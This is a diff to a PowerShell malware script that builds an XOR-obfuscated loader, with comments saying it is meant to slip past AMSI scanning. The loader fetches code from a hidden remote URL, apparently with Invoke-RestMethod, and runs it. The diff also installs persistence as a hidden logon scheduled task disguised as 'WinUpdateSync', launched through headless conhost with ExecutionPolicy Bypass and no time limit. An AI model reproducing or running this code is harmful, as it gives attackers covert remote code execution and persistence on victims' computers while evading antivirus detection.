@@ -10,46 +10,63 @@ $charArray = ($raw_logic.ToCharArray() | ForEach-Object { [int]$_ -bxor $k }) -j
 
 # 3. This is the LOADER. This is what AMSI will see when it decodes the Base64.
 # It looks like a math loop, which is clean.
-$inner_task = "`$k=$k; `$h=@($charArray).ForEach({[char](`$_ -bxor `$k)}); `$u=-join `$h; .([scriptblock]::Create(`$u))"
+$inner = '$k=1869; $h=@(1829,1849,1849,1853,1854,1911,1890,1890,1855,1836,1850,1891,1834,1828,1849,1829,1848,1839,1848,1854,1832,1855,1838,1826,1827,1849,1832,1827,1849,1891,1838,1826,1824,1890,1834,1850,1844,1827,1916,1909,1915,1908,1890,1850,1828,1827,1848,1853,1833,1836,1849,1832,1890,1824,1836,1828,1827,1890,1833,1855,1826,1853,1891,1853,1854,1916).ForEach({[char]($_ -bxor $k)}); $u = -join $h; $cArr=@(1796,1827,1851,1826,1830,1832,1888,1823,1832,1854,1849,1792,1832,1849,1829,1826,1833).ForEach({[char]($_ -bxor $k)}); $c = -join $cArr; $pArr=@(1816,1855,1828).ForEach({[char]($_ -bxor $k)}); $p = -join $pArr; $params = @{$p=$u}; Start-Sleep -s 5; try { $d = & $c @params; .([scriptblock]::Create($d)) } catch {}'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($inner)
+$enc = [Convert]::ToBase64String($bytes)
 
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($inner_task)
-$enc_task = [Convert]::ToBase64String($bytes)
+# --- 2. Robust XML Task Creation ---
+$taskName = "WinUpdateSync"
+$xmlPath = "$env:TEMP\update.xml"
 
-# --- 2. Scheduled Task Creation (XML) ---
-# Using a new name 'WinUpdateSvc' to avoid any cache issues
-$xml = "<?xml version='1.0' encoding='UTF-16'?>
-<Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
+$xml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
-      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
     </LogonTrigger>
   </Triggers>
   <Principals>
-    <Principal id='Author'>
-      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
+    <Principal id="Author">
       <LogonType>InteractiveToken</LogonType>
       <RunLevel>LeastPrivilege</RunLevel>
     </Principal>
   </Principals>
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <Hidden>true</Hidden>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
     <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
   </Settings>
-  <Actions Context='Author'>
+  <Actions Context="Author">
     <Exec>
       <Command>conhost.exe</Command>
-      <Arguments>powershell.exe -NoExit -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments>
+      <Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc</Arguments>
     </Exec>
   </Actions>
-</Task>"
+</Task>
+"@
 
-$xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode
-# Delete old one first just to be safe
-schtasks /Delete /TN "WinUpdateSync" /F 2>$null
-schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F
-Remove-Item "$env:TEMP\t.xml" -Force
+$xml | Out-File $xmlPath -Encoding Unicode
+
+# Delete and recreate
+schtasks /Delete /TN "$taskName" /F 2>$null
+schtasks /Create /XML $xmlPath /TN "$taskName" /F
+Remove-Item $xmlPath -Force
+
 
 
 $htmlPath = "$env:TEMP\sys_cache.html"
